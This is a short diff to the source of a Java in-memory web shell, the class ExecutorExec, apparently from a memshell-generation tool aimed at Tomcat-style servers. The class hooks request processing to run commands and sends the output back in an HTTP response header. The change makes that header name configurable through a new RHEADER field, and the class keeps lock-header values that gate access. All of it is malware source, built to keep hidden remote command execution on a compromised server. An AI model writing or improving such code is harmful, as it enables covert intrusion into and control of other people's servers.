@@ -17,11 +17,11 @@ import java.util.concurrent.TimeUnit;
  */
 @MemShell(MemShell.Executor)
 @MemShellFunction(MemShellFunction.Exec)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
 public class ExecutorExec implements InvocationHandler {
     private static String HEADER;
+    private static String RHEADER;
     private Object targetObject;
-    private String responseHeader = "Data";
     private static String lockHeaderKey;
     private static String lockHeaderValue;
 
@@ -85,7 +85,7 @@ public class ExecutorExec implements InvocationHandler {
             Object req = getFieldValue(processor, "req");
             Object response = req.getClass().getMethod("getResponse").invoke(req);
 
-            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{responseHeader, result});
+            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
 
             // todo
             // doWrite() Http11InputBuffer.java:434  报错 java.lang.IllegalArgumentException  待分析
